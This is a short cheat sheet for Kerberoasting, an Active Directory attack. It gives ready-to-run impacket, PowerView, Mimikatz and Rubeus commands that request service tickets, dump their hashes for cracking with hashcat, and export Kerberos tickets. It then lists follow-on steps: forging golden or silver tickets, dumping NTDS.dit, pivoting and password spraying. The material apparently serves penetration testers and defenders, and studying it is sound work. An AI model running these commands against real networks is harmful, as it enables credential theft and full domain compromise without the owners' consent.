# kerberoasting

All domain users can request a copy of all service accounts along with their password hashes. This allows user to
request service ticket (ST) for any service w/ registered SPN (service princical name) then use the ST to crack service
password.

* [Invoke-Kerberoast.ps1](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/Invoke-Kerberoast.ps1)
* [kekeo](https://github.com/gentilkiwi/kekeo)

## Usage

### impacket

```bash
impacket-GetUserSPNs DOMAIN.com/USER:'PASS' -dc-ip DC_IP -request
# hashcat -m 13100
```

### using powerview

```bash
#Get User Accounts that are used as Service Accounts
Get-NetUser -SPN

#Get every available SPN account, request a TGS and dump its hash
Invoke-Kerberoast

#Requesting the TGS for a single account:
Request-SPNTicket
  
#Export all tickets using Mimikatz
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

### using rubeus

```bash
# using Rubeus.exe
Rubeus.exe kerberoast /domain:DOMAIN /creduser:USER /credpassword:PASS [/rc4opsec]
/rc4opsec: safe kerberoasting (not on AES enabled accounts)

```

## post kerberoasting

* If the service account is domain admin > Golden/Silver ticket > dumping the NTDS.dit.
* If the service account is not domain admin > log into system with creds > pivot/escalate > password spray other
  service and domain admin accounts